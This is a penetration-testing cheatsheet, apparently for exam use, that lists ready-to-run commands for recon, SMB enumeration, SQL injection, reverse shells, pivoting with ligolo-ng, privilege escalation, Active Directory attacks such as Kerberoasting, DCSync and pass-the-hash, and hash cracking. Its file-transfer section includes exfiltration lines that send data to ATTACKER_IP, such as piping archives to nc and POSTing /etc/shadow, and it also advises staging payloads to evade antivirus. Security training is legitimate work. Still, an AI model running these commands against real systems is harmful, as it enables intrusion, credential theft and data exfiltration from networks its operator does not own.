# Moraa — Fast-Path Cheatsheet (exam speed)

> **Tier 2 — operator layer.** This doc describes *one* working setup, published as a
> reference rather than a requirement. Yours will differ; nothing in the methodology
> depends on it. See [CUSTOMIZATION.md](CUSTOMIZATION.md).

> The single most-used command per step. Replace ATTACKER_IP / TARGET / SUBNET / USER / PASS.
> For depth, jump to the phase doc. This is for "give me the command NOW".

## Recon
```bash
nmap -p- --min-rate 5000 -Pn -oA recon/all TARGET            # fast all-ports
nmap -sCV -p <open> -oA recon/svc TARGET                     # then targeted
subfinder -d TARGET -all -silent | httpx -silent -sc -title -td   # web ext
nxc smb SUBNET/24                                            # internal sweep + signing
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

## SMB / shares
```bash
nxc smb TARGET -u '' -p '' --shares                          # null
nxc smb TARGET -u USER -p PASS --shares --users --pass-pol
smbclient -N -L //TARGET                                     # list
smbclient //TARGET/share -U USER                             # connect
```

## Web foothold
```bash
ffuf -w params.txt -u "http://TARGET/api?FUZZ=x" -ac -mc 200 # hidden params
sqlmap -r req.txt --batch --dbs                              # SQLi
# webshell after upload → reverse shell (see payloads/reverse-shells.md)
```

## Reverse shell catch + upgrade
```bash
rlwrap nc -lvnp 443
python3 -c 'import pty;pty.spawn("/bin/bash")'; # Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

## Pivot (ligolo-ng — DEFAULT)
```bash
sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601                       # attacker
./agent -connect ATTACKER_IP:11601 -ignore-cert             # victim (agent.exe on Win)
# console: session → 1 → start ;  then:  sudo ip route add SUBNET/24 dev ligolo
```

## Linux privesc (first 3)
```bash
sudo -l                                                      # → GTFOBins
find / -perm -4000 -type f 2>/dev/null                       # SUID → GTFOBins
./linpeas.sh | tee linpeas.txt
```

## Windows privesc (first 3)
```cmd
whoami /priv                                                 :: SeImpersonate → GodPotato/PrintSpoofer
.\winPEASany.exe quiet cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
.\GodPotato-NET4.exe -cmd "cmd /c whoami"                    :: SeImpersonate → SYSTEM
```

## AD core
```bash
bloodhound-python -d corp.local -u USER -p PASS -ns DC_IP -c All --zip
nxc ldap DC_IP -u USER -p PASS --kerberoasting kerb.txt
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat   # AS-REP
impacket-secretsdump corp.local/USER:PASS@DC_IP -just-dc-user krbtgt                          # DCSync
certipy find -u USER@corp.local -p PASS -dc-ip DC_IP -vulnerable -stdout                      # ADCS
```

## Lateral movement
```bash
nxc smb SUBNET/24 -u USER -H NTHASH                          # PtH spray (Pwn3d! = admin)
evil-winrm -i TARGET -u USER -H NTHASH                       # winrm
impacket-wmiexec corp.local/USER@TARGET -hashes :NTHASH      # wmi (quiet)
impacket-psexec corp.local/USER@TARGET -hashes :NTHASH       # psexec (SYSTEM, noisy)
```

## Cracking (top modes)
```bash
hashcat -m 13100 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule   # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt                              # AS-REP
hashcat -m 1000 ntlm.txt rockyou.txt                                # NTLM
hashcat -m 5600 netntlmv2.txt rockyou.txt                           # Responder
john --wordlist=rockyou.txt hash.txt
```

## File transfer (to/from victims)

> Constant need. Serve from attacker, pull from victim. Replace ATTACKER_IP / FILE.

### Serve from attacker (pick one)
```bash
python3 -m http.server 80                         # HTTP
python3 -m http.server 443                         # if 80 blocked
impacket-smbserver share . -smb2support            # SMB (great for Windows)
impacket-smbserver share . -smb2support -user u -password p   # authenticated SMB (Win10+ needs this)
sudo python3 -m uploadserver 80                    # accepts uploads (pip install uploadserver)
nc -lvnp 4444 > incoming.file                      # raw catch
```

### Pull to victim — Linux
```bash
wget http://ATTACKER_IP/FILE -O /tmp/FILE
curl http://ATTACKER_IP/FILE -o /tmp/FILE          # or: curl -O http://ATTACKER_IP/FILE
# no wget/curl:
exec 3<>/dev/tcp/ATTACKER_IP/80; echo -e "GET /FILE HTTP/1.0\r\n\r" >&3; cat <&3 > /tmp/FILE
scp user@ATTACKER_IP:/path/FILE .                  # if ssh out allowed
```

### Pull to victim — Windows
```cmd
certutil -urlcache -f http://ATTACKER_IP/FILE FILE.exe
curl http://ATTACKER_IP/FILE -o FILE.exe           :: curl ships in modern Win
```
```powershell
iwr http://ATTACKER_IP/FILE -OutFile FILE.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/FILE','C:\\Windows\\Temp\\FILE.exe')
# from SMB share:
copy \\ATTACKER_IP\share\FILE.exe C:\Windows\Temp\
```

### Exfil FROM victim (loot back to you)
```bash
# Linux → attacker (attacker: nc -lvnp 4444 > loot.tgz)
tar czf - /loot/dir | nc ATTACKER_IP 4444
curl -X POST http://ATTACKER_IP/ -F 'f=@/etc/shadow'        # to uploadserver
# Windows → SMB share you host
copy C:\loot\file.dmp \\ATTACKER_IP\share\
```
```powershell
# Windows → HTTP POST
iwr -Uri http://ATTACKER_IP/ -Method POST -InFile C:\loot\file.dmp
# base64 small files through a shell when no transfer works
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\f'))  # → copy → base64 -d on attacker
```

### Through a pivot
- ligolo: add a `listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80` so internal hosts hit your
  http.server via the pivot IP (see `pivoting.md`).
- proxychains: `proxychains -q wget http://INTERNAL/...` won't help inbound — use the relay.

### Gotchas
- Win10/11 SMB refuses guest auth → use the `-user/-password` smbserver form, then
  `net use \\ATTACKER_IP\share /u:u p`.
- AV eats payloads on write → stage to `C:\Windows\Temp` or `\\ATTACKER_IP\share` and run from
  memory where possible; consider `offensive-edr-evasion.md` if blocked.
- Always `chmod +x` Linux binaries after transfer.

## The loop (internal)
`pivot → nxc sweep → AS-REP/spray/relay → first creds → bloodhound → path to DA → escalate → secretsdump → PtH next → repeat → krbtgt → DA`. Document every hop into `findings/`.
